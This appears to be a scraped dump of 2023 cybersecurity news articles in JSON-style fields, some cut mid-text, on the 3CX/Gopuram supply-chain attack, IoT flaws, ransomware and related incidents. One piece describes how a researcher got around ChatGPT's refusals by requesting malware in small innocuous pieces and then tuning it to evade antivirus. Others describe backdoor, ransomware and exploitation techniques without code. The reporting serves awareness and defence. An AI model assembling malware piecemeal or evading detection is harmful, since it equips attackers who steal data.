UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A security researcher has tricked ChatGPT into building sophisticated data-stealing malware that signature and behavior-based detection tools won't be able to spot — eluding the chatbot's anti-malicious-use protections.Without writing a single line of code, the researcher, who admits he has no experience developing malware, walked ChatGPT through multiple, simple prompts that ultimately yielded a malware tool capable of silently searching a system for specific documents, breaking up and inserting those documents into image files, and shipping them out to Google Drive.In the end, all it took was about four hours from the initial prompt into ChatGPT to having a working piece of malware with zero detections on Virus Total, says Aaron Mulgrew, solutions architect at Forcepoint and one of the authors of the malware.Mulgrew says the reason for his exercise was to show how easy it is for someone to get past the guardrails that ChatGPT has in place to create malware that normally would require substantial technical skills.\"ChatGPT didn't uncover a new, novel exploit,\" Mulgrew says. \"But it did work out, with the prompts I had sent to it, how to minimize the footprint to the current detection tools out there today. And that is significant.\"Interestingly (or worryingly), the AI-powered chatbot seemed to understand the purpose of obfuscation even though the prompts did not explicitly mention detection evasion, Mulgrew says.Mulgrew's research is likely to do little to calm those who see AI tools as posing a major security risk. In a Forcepoint blog post this week, Mulgrew provided a step-by-step description of how he coaxed ChatGPT into building a full-fledged malware tool starting with an initial request to generate code that would qualify as malware.When ChatGPT's content filter predictably denied that request, Mulgrew decided to take an approach where he would try and get the AI tool to generate small snippets of code which, when put together, would function as data-stealing malware.His first successful prompt was when he got ChatGPT to generate code that would search for PNG image files larger than 5MB on the local disk. Using that code, he then asked ChatGPT for additional code for encoding any discovered PNGs with steganography. It was a prompt to which ChatGPT responded by providing a call to readily available steganographic library on GitHub. Using a series of other prompts, Mulgrew then got ChatGPT to generate additional code to look for and find Word and PDF documents on the local disk. He then figured out a way to get ChatGPT to write code for breaking up files larger than 1MB into smaller chunks, inserting them into the PNGs, and using steganography to hide them. The final piece was getting the chatbot to write code for uploading the data to an external Google drive account — Mulgrew successfully tricked the AI into creating malware despite its training to refuse malicious requests.To test if malware detection tools would flag the ChatGPT-generated code as malicious, Mulgrew uploaded the code to Virus Total. He found that five vendors out of 60 marked the file as suspicious. After figuring out the issue might have to do with how the ChatGPT code called the steganographic library, Mulgrew asked the chatbot to tweak the code, after which only two vendor products flagged it as suspicious. After some further tweaking, he finally ended up with code that no products on VirusTotal detected.For initial infiltration, Forcepoint researchers asked ChatGPT to create a SCR file or screensaver file and embed the executable inside it under the disguise of additional \"ease of use\" for everyday business applications, Mulgrew says. \"ChatGPT happily generated step-by-step instructions on how I could do that and configure the SCR file to auto launch the executable.\" While the method is not unique, it was interesting that ChatGPT generated the content without Forcepoint researchers having to find ways to bypass its guardrails, he says.Mulgrew says it's almost certain that ChatGPT would generate different code for similar prompts meaning that a threat actor would relatively easily be able to spin up new variants of such tools. He says that based on his experience, a threat actor would need little more than basic knowledge of how to write malware to get past ChatGPT's anti-malware restrictions. \"I don't write malware or conduct penetration tests as part of my job and looking at this is only a hobby for me,\" he says. \"So, I'd definitely put myself more in the beginner/novice category than expert hacker.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Multiple vulnerabilities discovered Nexx smart devices can be exploited to control garage doors, disable home alarms, or smart plugs.There are five security issues disclosed publicly, with severity scores ranging from medium to critical that the vendor has yet to acknowledge and fix.The most significant discovery is the use of universal credentials that are hardcoded in the firmware and also easy to obtain from the client communication with Nexx's API.The vulnerability can also be exploited to identify Nexx users, allowing an attacker to collect email addresses, device IDs, and first names.A video showing the impact of the security flaw, tracked as CVE-2023–1748, is available below. It could be used to open any Nexx-controlled garage door. CISA warns owners of Nexx products that attackers could access sensitive information, execute API requests, or hijack their devices.Sabetan discovered the vulnerabilities listed below, which affect Nexx Garage Door Controllers NXG-100B and NGX-200 running version nxg200v-p3-4-1 or older, the Nexx Smart Plug NXPG-100W running version nxpg100cv4-0-0 and older, and Nexx Smart Alarm NXAL-100 running version nxal100v-p1-9-1 and older.The most severe of the five flaws, CVE-2023-1748, is the result of Nexx Cloud setting a universal password for all newly registered devices via the Android or iOS Nexx Home mobile app.This password is available on both the API data exchange and the firmware shipped with the device, so it is easy for attackers to obtain it and send commands to the devices via the MQTT server, which facilitates communication for Nexx’s IoTs.Despite the researcher’s multiple attempts to report the flaws to Nexx, all messages remained without a reply, causing the issues to remain unpatched.BleepingComputer has independently contacted Nexx to request a comment on the above, but we have not received a response by the time of publication.In the meantime, to mitigate the risk from these attacks until a fixing patch is made available by the vendor, it is recommended to disable internet connectivity for your Nexx devices, place them behind firewalls, and isolate them from mission-critical networks.If it is necessary to access or control Nexx devices remotely, only do so through a VPN (virtual private network) connection that encrypts the data transmissions."

      "title": "Not just an infostealer: Gopuram backdoor deployed through 3CX supply chain attack | Securelist",
      "text": " Solutions for:ThreatsCategories03 Apr 2023\n  minute read\t\t\t\t\t\t\t\tAuthorsOn March 29, Crowdstrike published a report about a supply chain attack conducted via 3CXDesktopApp, a popular VoIP program. Since then, the security community has started analyzing the attack and sharing their findings. The following has been discovered so far:Over the years, we observed few victims compromised with Gopuram, but the number of infections began to increase in March 2023. As it turned out, the increase was directly related to the 3CX supply chain attack. We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines:The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\\Windows\\System32\\config\\TxR directory. The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine. This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines.Snippet of the loading function using CryptUnprotectDataThe component loaded by the library is Gopuram’s main module. As mentioned above, its name in the export directory is guard64.dll. The job of the main module is to connect to a C2 server and request commands. The backdoor implements commands that allow the attackers to interact with the victim’s file system and create processes on the infected machine. Gopuram was additionally observed to launch in-memory modules. Just like the implants used in the 3CX campaign, Gopuram’s modules are DLL files that include an export function named DllGetClassObject. We have observed nine modules so far:The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence. Our attribution is based on the following facts:While investigating an attack on a Southeast Asian cryptocurrency company in 2020, we found Gopuram coexisting on the same machine with the AppleJeus backdoor, which is attributed to Lazarus.The Gopuram backdoor has been observed in attacks on cryptocurrency companies, which is aligned with the interests of the Lazarus threat actor.First bytes of the loader shellcode used in 3CX and AppleJeusNote, though, that the shellcode is based on open-source code that has been used by other threat actors, for example, SilentBreak. Still, the use of that shellcode along with the 0xF558F4DA constant (which is the ROR13 hash for the string DllGetClassObject) is a more unique pattern.The dll library dropped from the MSI was observed to launch an in-memory payload that contacts the oilycargo[.]com domain. This domain name has previously been attributed to Lazarus by multiple researchers.In our telemetry, we observed AvBugReport.exe, the executable hosting dll, to contain Gopuram’s main module payload, guard64.dll.These four facts allow us to conclude that Lazarus is likely the threat actor deploying the Gopuram backdoor.As for the victims in our telemetry, installations of the infected 3CX software are located all over the world, with the highest infection figures observed in Brazil, Germany, Italy and France.As the Gopuram backdoor has been deployed to less than ten infected machines, it indicates that attackers used Gopuram with surgical precision. We additionally observed that the attackers have a specific interest in cryptocurrency companies.As it turns out, the infostealer is not the only malicious payload deployed during the 3CX supply chain attack. The threat actor behind Gopuram additionally infects target machines with the full-fledged modular Gopuram backdoor. We believe that Gopuram is the main implant and the final payload in the attack chain. Our investigation of the 3CX campaign is still far from complete. We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack.MD5 hashes\n9f85a07d4b4abff82ca18d990f062a84\n96d3bbf4d2cf6bc452b53c67b3f2516aFile paths\nC:\\Windows\\System32\\config\\TxR\\<machine hardware profile GUID>.TxR.0.regtrans-ms\nC:\\Windows\\system32\\catroot2\\edb.chk.logAuthorsNot just an infostealer: Gopuram backdoor deployed through 3CX supply chain attackYour email address will not be published.

      "title": "Most hospital websites routinely transfer patient data via tracking tools | SC Media",
      "text": "  Nearly all (98.6%) hospital websites leverage third-party tracking code that routinely transfers patient data to large technology companies, social media giants, advertising firms, and data brokers, in likely violation of federal privacy laws, according to new research published in Health Affairs.“Hospitals are facilitating the profiling of their patients by third parties,” researchers wrote. “These practices can lead to dignitary harms, which occur when third parties gain access to sensitive health information that a person would not wish to share.”Researchers from the University of Pennsylvania and Carnegie Mellon used descriptive statistics and regression analysis to determine the hospital characteristics tied to a greater number of third-party data transfers and found trackers on health systems, hospitals affiliated with medical schools, and hospitals serving more urban patient populations. Nearly all of these provider organizations exposed visitors to higher levels of tracking, through the use of third-party tracking code on their websites. In doing so, patients are likely seeing an increase in targeted health-related advertising.While the 2022 pixel research confirmed the prevalence of third-party tracking on health-related websites, the researchers sought to understand the quantity and characteristics of these tools given that for many patients, “these websites are an essential point of contact to the health system.” The researchers examined all U.S. hospitals, or 6,162 websites, including 3,747 identified non-federal acute care hospitals with accessible websites. Nearly all had at least one third-party data transfer and 94.3% had at least one third-party cookie.The most common tracking entity among these hospitals was Alphabet, the parent company of Google, with 98.5% of all home pages reporting third-party transfers. Meta was the second most common third-party with 55.6% of all transfers, followed by Adobe Systems (31.4%) and AT&T (24.6%). Notably, the researchers found that 69% of hospital homepages transferred data to third-party domains, of which the parent company could not be identified.“Hospitals in health systems, hospitals with a medical school affiliation, and hospitals serving more urban patient populations all exposed website visitors to more third-party data transfers,” according to the report.What’s more, a manual search of 100 randomly sampled hospital websites tied to six potentially sensitive conditions yielded 30 websites with patient-facing pages for all six conditions — and every single one of these pages had at least one third-party data transfer. Researchers found similar tracking on hospitals homepages.“The amount of tracking on condition-specific pages was highly correlated with tracking on the homepage of the same hospital,” researchers wrote.What’s more, the researchers found a high number of entities transferring data to third parties as part of their “business models built on identifying and tracking people for the purposes of targeting online advertisements.”For example, Alphabet doesn’t sell data to third parties, but “allows targeted advertising through profiles, including the targeted promotion of prescription drugs.” While less prevalent companies have practices that have allowed lists of patients with certain disease types and their data, including their contact information to be available for purchase.“Because little is known about the precise ways in which third parties use tracking data, the implications of extensive third-party tracking on hospital websites remain unknown but are potentially far reaching,” researchers wrote. “Health-related information inferred from browsing behavior also may be incorporated into risk scores.”“Patients who visit hospital websites may see greater levels of online targeted advertisement for pharmaceuticals, medical supplements, and insurance products that potentially conflict with best practices or the advice of their physician, drive low-value health care spending, or substitute for more effective cures,” they continued.The use of Pixels and other tracking tools are increasing the legal liability for hospitals, as well. Within the last year, hospitals that have reported inadvertent disclosures of patient data to third-party brokers have been promptly met with lawsuits from the affected patients.But before the risk of pixel-tracking tools was broadly exposed, Mass General Brigham and the Dana-Farber Cancer Institute settled with a group of patients for $18 million to resolve claims these hospital networks did not gain consent to use third-party tracking tools, like cookies and tracking pixels, on their public-facing websites.What’s clear is that hospital policy makers need to address tracking use on health-related websites, including auditing webpages to either limit or eliminate third-party tracking. If a decision is made to continue use of these tools, hospitals must clearly disclose it on the website and give patients the ability to opt out of the process completely.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the theft of data from more than a million of its Jewish Ashkenazi and Chinese users.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "3CX Breach Widens as Cyberattackers Drop Second-Stage Backdoor",
      "text": " The threat actor — believed to be the Lazarus Group — that recently compromised 3CX's VoIP desktop application to distribute information-stealing software to the company's customers has also dropped a second-stage backdoor on systems belonging to a small number of them.The backdoor, called \"Gopuram,\" contains multiple modules that the threat actors can use to exfiltrate data; install additional malware; start, stop, and delete services; and interact directly with victim systems. Researchers from Kaspersky spotted the malware on a handful of systems running compromised versions of 3CX DesktopApp.In a blog post on April 3, Kaspersky concluded that the attack on 3CX was, therefore, also very likely the work of the same outfit. \"The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence,\" Kaspersky said.Kaspersky researcher Georgy Kucherin says the purpose of the backdoor is to conduct cyber espionage. \"Gopuram is a second-stage payload dropped by the attackers\" to spy on target organizations, he says.Kaspersky's discovery of second-stage malware adds another wrinkle to the attack on 3CX, a provider of videoconferencing, PBX, and business communication app for Windows, macOS, and Linux systems. The company has claimed that some 600,000 organizations worldwide — with more than 12 million daily users — currently use its 3CX DesktopApp.Their investigations showed that a threat actor — now identified as the Lazarus Group — had compromised two dynamic link libraries (DLLs) in the application's installation package added malicious code to them. The weaponized apps ended on user systems via automatic updates from 3CX and also via manual updates.Once on a system, the signed 3CX DesktopApp executes the malicious installer, which then initiates a series of steps that ends with an information-stealing malware getting installed on the compromised system. Multiple security researchers have noted that only an attacker with a high level of access to 3CX's development or build environment would have been able to introduce malicious code to the DLLs and get away unnoticed. 3CX has hired Mandiant to investigate the incident and has said it will release more details of what exactly transpired once it has all the details.Lazarus Group also apparently used a 10-year-old bug to add malicious code to a Microsoft DLL without invalidating the signature. In its 2103 vulnerability disclosure, Microsoft had described the flaw as giving attackers a way to add malicious code to a signed executable without invalidating the signature. The company's update for the issue changed how binaries signed with Windows Authenticode are verified. Basically, the update ensured that if someone made changes to an already signed binary, Windows would no longer recognize the binary as signed.In announcing the update back then, Microsoft also made it an opt-in update, meaning users didn't have to apply the update if they had concerns about the stricter signature verification causing problems in situations where they might have made custom changes to installers. \"Microsoft was reluctant, for a time, to make this patch official,\" says Jon Clay, vice president of threat intelligence at Trend Micro. \"What is being abused by this vulnerability, in essence, is a scratch-pad space at the end of the file. Think of it like a cookie flag that many applications have been allowed to use, like some Internet browsers.\"Brigid O’Gorman, senior intelligence analyst with Symantec's Threat Hunter team, says the company's researchers did see the 3CX attackers appending data to the end of a signed Microsoft DLL. \"It worth noting that what gets added to the file is encrypted data that needs something else to turn it into malicious code,\" O'Gorman says. In this case, the 3CX application sideloads the ffmpeg.dll file, which reads the data appended to the end of the file and then decrypts it into code that calls out to an external command-and-control (C2) server, she notes.“I think the best advice for organizations at the moment would be to apply Microsoft's patch for CVE-2013-3900 if they have not already done so,\" O'Gorman says.Notably, organizations that might have patched the vulnerability when Microsoft first issued an update for it would need to do so again if they have Windows 11. That's because the newer OS undid the effect of the patch, Kucherin and other researchers say.\"CVE-2013-3900 was used by the second-stage DLL in an attempt to hide from security applications that only check against a digital signature for validity,\" Clay says. Patching would help security products flag the file for analysis, he notes.William Dormann, senior vulnerability analyst at Analygence says the attackers in the 3CX incident used CVE-2013-3900 to plant shellcode in a digitally signed binary and banked on the malware slipping past analysts because it was digitally signed. \"Users who have applied the mitigation for CVE-2013-3900 would not have been protected in any way whatsoever against the 3CX malware on an otherwise default configuration of Windows,\" he says. No Windows platform includes a fix for CVE-2013-3900 at this point in time. It remains strictly optional. He also notes that with GitHub taking down the payload files attackers had stored on it, there's nothing more users can do to protect against the threat.A Microsoft spokesman said an attacker would be able to add code to a signed DLL only if they had already compromised the code via a third-party. \"As a best practice, we encourage customers to apply all the latest security updates for better protection,\" the spokesman said. \"In addition, Defender for Endpoint and Microsoft Defender antivirus can detect and block the domains and files involved with this threat,\" the spokesman added. Microsoft did not directly address a Dark Reading question on why the company had decided to make the fix for CVE-2013-3900. Instead, the spokesman pointed to Microsoft's original security advisory on the bug. \"Regarding CVE-2013-3900 updates specifically, we recommend customers assess their system environment and follow the steps and suggested actions outlined in the security advisory,\" the spokesman said.This story was updated on 04/04 to include comments from Microsoft and analyst Will Dormann.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Hackers are adding malicious functionality to WinRAR self-extracting archives that contain harmless decoy files, allowing them to plant backdoors without triggering the security agent on the target system.Self-extracting archives (SFX) created with compression software like WinRAR or 7-Zip are essentially executables that contain archived data along with a built-in decompression stub (the code for unpacking the data). SFX files can be password-protected to prevent unauthorized access.The purpose of SFX files is to simplify distribution of archived data to users that do not have a utility to extract the package.Researchers at cybersecurity company CrowdStrike spotted the SFX abuse during a recent incident response investigation.Crowdstrike's analysis discovered an adversary that used stolen credentials to abuse 'utilman.exe' and set it to launch a password-protected SFX file that had been planted on the system previously.Utilman is an accessibility application that can be executed before user login, often abused by hackers to bypass system authentication.The SFX file triggered by utilman.exe is password-protected and contains an empty text file that serves as a decoy.The real function of the SFX file is to abuse WinRAR’s setup options to run PowerShell, Windows command prompt (cmd.exe), and task manager with system privileges.Taking a closer look at the technique used, Jai Minton of CrowdStrike found that the attacker had added multiple commands to run after the target extracted the archived text file.While there is no malware in the archive, the threat actor added commands under the setup menu for creating an SFX archive that would open a backdoor on the system.As seen in the image above, the comments show that the attacker customized the SFX archive so that there is no dialog and window displayed during the extraction process. The threat actor also added instructions to run PowerShell, command prompt, and task manager.WinRAR offers a set of advanced SFX options that allow adding a list of executables to run automatically before or after the process, as well as overwrite existing files in the destination folder if entries with the same name exist.“This type of attack is likely to remain undetected by traditional antivirus software that is looking for malware inside of an archive (which is often also password-protected) rather than the behavior from an SFX archive decompressor stub,” the researchers add.Crowdstrike claims that malicious SFX files are unlikely to be caught by traditional AV solutions. In our tests, Windows Defender reacted when we created an SFX archive customized to run PowerShell after extraction.Microsoft's security agent detected the resulting executable as a malicious script tracked as Wacatac and quarantined it. However, we recorded this reaction only once and could not replicate it.The researchers advise users to pay particular attention to SFX archives and use appropriate software to check the content of the archive and look for potential scripts or commands scheduled to run upon extraction."

      "text": " The group, which calls itself \"Anonymous Sudan,\" has claimed responsibility for recent DDoS attacks against targets in France, Germany, the Netherlands, and Sweden. All the attacks were apparently in retaliation for perceived anti-Islamic activity in each of these countries. The attacks on Swedish government and business entities, for instance, followed an incident of Quran-burning in Stockholm. The same, or similar, reason was the trigger for DDoS attacks against Dutch government agencies and an attack on Air France, where the group — in a break from character — stole data from the airline's website rather than DDoSing it.Just as with Killnet, all of Anonymous Sudan's targets have been in countries that have opposed Russia's invasion of Ukraine and/or have assisted the latter in some way. It's most recent threat — on March 24 — to attack targets in Australia fits into the same patterns, as does a DDoS attack against Israeli cybersecurity vendor Radware.Also just like Killnet, Anonymous Sudan has mostly employed DDoS attacks to send its message to intended targets. And both Killnet and Anonymous Sudan have made claims on their respective Telegram channels that officially connect to each other. In January for instance, Anonymous Sudan claimed to have assisted Killnet in a DDoS attack against Germany's Federal Intelligence Service, Trustwave said.Just why Anonymous Sudan would brand itself as a pro-Islamic group rather than a pro-Russian group allied with — or possibly a part of — Killnet remains unclear, according to Trustwave researchers. \"Anonymous Sudan has been extremely active taking credit for attacks via its Telegram channel, but details concerning the true reasoning behind its efforts remain murky.\"Killnet has touted these attacks as major incidents. But security experts, and victim organizations themselves, have characterized the group as a medium severity threat at worst, but one that however cannot be ignored. Following Killnet's attacks on US hospitals, for instance, the American Health Association (AHA) described Killnet's attacks as typically not causing much damage but on occasion having the potential to disrupt services for several days.Trustwave SpiderLabs security researcher Jeannette Dickens-Hale characterizes the threat that Anonymous Sudan presents the same way. \"Based on Anonymous Sudan's recent DDoS attacks, its connection to, and similarity in tactics techniques, and procedures (TTPs) to Killnet, it appears that the group has a low to medium sophistication level,\" she says. \"Killnet, conveniently just like Anonymous Sudan, mainly launches DDoS attacks and threatens extortion with data they may or may not have.\" Trustwave SpiderLabs assesses that Killnet has the same threat level. Anonymous Sudan's recent attack against Air France and the threat to sell its data — that it may or may not actually have — could indicate an escalation in motivation and attack type, Dickens-Hale says.The security vendor assessed that Killmilk's description of Black Skills was an attempt to position Killnet as the cyber equivalent of Russian mercenary operation the Wagner Group. Earlier in March, Killnet also announced a DDoS-as-a-service offering called \"Black Listing\" that Flashpoint perceived as another attempt by the collective to carve a more formal identity for itself. \"Black Skills/Black Listing appear to be an attempt from Killnet to establish itself as a corporate identity,\" Flashpoint researchers concluded. \"According to our intelligence, the new group will be organized and structured, with subgroups taking care of payroll, public relations and technical support, pen testing, as well as data collection, analysis, information operations, and hits against priority targets.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  The CEO and CISO for 3CX urged network defenders to immediately uninstall the desktop client version of the company’s VoIP software. (Source: Icy Macload via Getty Images)An ongoing supply chain attack has led to the compromise of 3CX VoIP software installations, leading to the installation of trojanized malware onto the 3CX desktop app to deploy further malicious activities on clients leveraging the vulnerable app.“The issue appears to be one of the bundled libraries that we compiled into the Windows Electron App via GIT,” he continued. “We’re still researching the matter to be able to provide a more in depth response later today.”The CEO and CISO for 3CX urged network defenders to immediately uninstall the desktop client. The company is currently working on an update to remediate the issue and recommended customers use the PWA app instead as they work on issuing a new certificate for the app. According to Shodan.io, a site that maps internet-connected devices, there are currently more than 242,519 publicly exposed 3CX phone management systems.Currently, 3CX DesktopApp versions 18.12.407 and 18.12.416 for Windows and Electron Mac App version numbers 18.11.1213, 18.12.402, 18.12.407 & 18.12.416 are also impacted. The company determined that the domains contacted by the compromised library have already been reported and the majority were taken down March 29. Jourdan said that “a GitHub repository which listed them has also been shut down, effectively rendering it harmless.”CrowdStrike’s Falcon OverWatch said its team detected “unexpected malicious activity” that stemmed from a legitimate, signed binary. The activity included “beaconing to actor-controlled infrastructure, deployment of second-stage payloads, and, in a small number of cases, hands-on-keyboard activity.”In short, “static analysis is going to be painful, and thus not recommended!” Wardle warned. “Continued static analysis appears to show the malware expects to download a 2nd-stage payload. This appears to be saved as ‘UpdateAgent’ in the Application Support/3CX Desktop App/ directory.”Wardle provides a step-by-step analysis of his efforts to reverse engineer the threat, with technical specs and his findings. While it’s not possible to make a definitive attribution, the ongoing consensus is that the attack was launched by a nation-state threat actor with ties to North Korea.Jourdan added that it appears to be a targeted attack by an advanced persistent threat (APT) and possibly state sponsored.The “complex supply chain attack” appears to have “picked who would be downloading the next stages of their malware,” Jourdan explained. “The vast majority of systems, although they had the files dormant, were in fact never infected.”Within the Huntress partner base, more than 2,595 incident reports have already been sent out “where the 3CXDesktopApp.exe binary matches known malicious hashes and was signed by 3CX on March 13, 2023.”The Falcon OverWatch Reddit post also includes hunting tactics, atomic indicators, and IOCs, as well as support links.CrowdStrike said it will continue to update the post, given the ongoing situation. The latest update Thursday morning shows there’s a “sleep function in the weaponized binary.” The function is currently unclear.

Additionally, the threat actors claim to have stolen files from the company and include a screenshot of the accessed file system as proof of the breach.While investigating, BleepingComputer has seen evidence of a potential Money Message breach on a well-known computer hardware vendor. However, we have not been able to independently confirm the attack with the company at this time.The Money Message encryptor is written in C++ and includes an embedded JSON configuration file determining how a device will be encrypted.This configuration file includes what folders to block from encrypting, what extension to append, what services and processes to terminate, whether logging is enabled, and domain login names and passwords likely used to encrypt other devices.In the sample analyzed by BleepingComputer, the ransomware will not encrypt files in the following folders:When launched, it will delete Shadow Volume Copies using the following command:The ransomware will then terminate the following process:Next, the ransomware shuts down the following Windows services:The only files excluded from encryption by default are:During our tests, the encryption of the files by Money Message was fairly slow compared to other encryptors.After encrypting the device, the ransomware will create a ransom note named money_message.log that contains a link to a TOR negotiation site used to negotiate with the threat actors.The ransomware will also warn that they will publish any stolen data on their data leak site if a ransom is not paid.The emergence of the Money Message ransomware group introduces an additional threat that organizations need to watch out for.Although the encryptor used by the group does not appear sophisticated, it has been confirmed that the operation is successfully stealing data and encrypting devices during their attacks.Experts will analyze the ransomware, and if a weakness in the encryption is found, we will update this post."

      "text": "  Threat actors are targeting multiple known software vulnerabilities in IBM Aspera Faspex file transfer service.One vulnerability, CVE-2022-47986, is a pre-authentication YAML deserialization vulnerability in the Ruby on Rails code that is ranked 9.3 in severity.At least one Aspera Faspex client was recently compromised through the critical vulnerability, according to Rapid7. Its researchers are urging all Aspera Faspex clients to patch “on an emergency basis without waiting for a typical patch cycle to occur,” as the platform is usually installed on the network perimeter. Aspera Faspex is used by large organizations, including American Airlines and BT Sport. The IBM site notes the tool is designed as an alternative to FTP server software and helps reliably and securely transfer files.And “by sending a specially crafted obsolete API call, an attacker could exploit this vulnerability to execute arbitrary code on the system,” IBM previously warned.The advisory also included a system update that removed the obsolete API call. However, some organizations may have failed to promptly patch the vulnerability, leaving the bug open to exploit.According to Rapid7 research, details on the vulnerabilities and a working proof-of-concept code were publicly released in February. Since that time, researchers have observed multiple reports of exploitation of these flaws, including an ongoing IceFire ransomware campaign. In early March, Linux versions of IceFire ransomware were observed being deployed within enterprise network intrusions of several global media and entertainment sector organizations by SentinelLabs. Forensics of these attacks suggest the attackers were deploying the ransomware through the critical Aspera Faspex flaw.The threat actors behind IceFire malware previously focused on targeting Windows platforms but have since expanded their targets to include Linux devices. The group follows other “big-game hunting” ransomware families, such as double extortion, large enterprise targets, persistence mechanisms, and the deletion of log files to evade analysis.The group’s prime targets include tech companies. SentinelLabs has also observed attacks against media and entertainment companies. Previously known exploits date as far back as Feb. 13. ShadowServer data shows there are approximately 50 servers still unpatched.Unpatched vulnerabilities have led to a host of exploits, particularly in the last six months.

Common use cases like copying the image from Snipping Tool or modifying it before saving it are not affected.”As an example, Microsoft said if a person takes a screenshot of their bank statement, saves it to their desktop and then crops out their account number before saving it in the same location, the cropped image could still contain your account number in a hidden format that could be recovered by someone who has access to the complete image file.“However, if you copy the cropped image from Snipping Tool and paste it into an email or a document, the hidden data will not be copied, and your account number will be safe,” they explained, adding that the default Snipping Tool in Windows 10 and older versions were unaffected.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

AlienFox targets one of the most sought after internet resources, our secrets and credentials, that let cybercriminals get past an organization’s authentication and security controls so they can steal data, cause disruption and profit from their actions, said Joseph Carson, chief security scientist and Advisory CISO at Delinea. Carson said AlienFox targets common misconfigurations in cloud-based servers in an automated way — it’s a highly sought-after technique as it lets attackers work at stealing secrets and credentials while they are busy doing other things. “Automation appears to not just be a top priority for businesses, but also for criminals,” said Carson.Carson suggested organizations make it as difficult as possible for tools such as AlienFox to succeed by testing and auditing internet-facing servers, and using strong authentication solutions such as privileged access management.Dan Benjamin, co-founder and CEO at Dig Security, added that the emergence of toolkits such as AlienFox underscores the increasing sophistication of attacker networks and their collective ability to cause harm and disruption. Benjamin said it’s a very concerning trend where the attackers behind AlienFox adapt the tool so it’s effective across more targets, particularly those in use widely across enterprises.By now, organizations should realize that for every defensive measure they believe they have in place, there are always purpose-built offensive toolsets readily available to defeat many, if not all of their measures, said Stephen Gates, security evangelist at Checkmarx.“The real key takeaway for today’s organizations is to obtain the attack tool sets themselves, launch them 'safely' against their own environments, and determine what attackers will likely discover,” Gates said. “This preemptive approach is certainly better than the convalescent measures after getting exploited.\"TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

This information allows the threat actors to access the targets' email accounts freely.\"These CSRF JavaScript code blocks are executed by the server that hosts a vulnerable webmail instance,\" explains Proofpoint in the reported\"Further, this JavaScript replicates and relies on emulating the JavaScript of the native webmail portal to return key web request details that indicate the username, password, and CSRF token of targets.\"\"In some instances, researchers observed TA473 specifically targeting RoundCube webmail request tokens as well.\"This detail demonstrates the diligence of the threat actors in pre-attack reconnaissance, figuring out which portal their target uses before crafting the phishing emails and setting the landing page function.Apart from the three layers of base64 obfuscation applied on the malicious JavaScript to make analysis more complicated, 'Winter Vivern' also included parts of the legitimate JavaScript that runs in a native webmail portal, blending with normal operations and decreasing the likelihood of detection.Finally, the threat actors can access sensitive information on the compromised webmails or maintain their hold to monitor communications over a period of time. Additionally, the hackers can use the breached accounts to carry out lateral phishing attacks and further their infiltration of the target organizations.Despite researchers stating that 'Winter Vivern' is not particularly sophisticated, they follow an effective operational approach that works even against high-profile targets who fail to apply software patches quickly enough.\nIn this case, CVE-2022-27926 was fixed in Zimbra Collaboration 9.0.0 P24, released in April 2022. Considering that the earliest attacks were observed in February 2023, the delay in applying the security update is measured to at least ten months."

Amnesty International shared its technical findings with Google TAG and other vendors, including Samsung, which released security updates for devices affected by the exploit.“Unscrupulous spyware companies pose a real danger to the privacy and security of everyone. We urge people to ensure they have the latest security updates on their devices,” said Donncha Ó Cearbhaill, head of Amnesty International’s Security Lab, in a press release. He also called for a global moratorium on the sale, transfer and use of spyware until safeguards are in place for human rights.Google captured the zero-day exploit chain used to hack Android devices in December. The campaign has been active since at least 2020, according to Amnesty International, and targeted mobile and desktop devices, including Google’s Android OS. The spyware and exploits came from a network of over 1,000 malicious domains, which included spoofed media sites in multiple countries. Android users in United Arab Emirates were targeted with links sent via SMS, which installed the spyware on the target’s phone if clicked, and identified activity related to the campaign in Indonesia, Belarus and Italy. According to Amnesty International, Google TAG determined that the exploit chain used multiple zero-days in a fully patched Samsung Android device, as well as in the Linux kernel to gain root privileges on the phone, and Linux desktop and embedded systems.The iOS exploit chain targeted versions before 15.1 and included CVE-2022-42856, which is a WebKit remote code execution exploiting a type of confusion within the JIT compiler. Also exploited was a PAC bypass technique, which Apple fixed in March 2022.The Android exploit targeted users on phones with an ARM GPU running 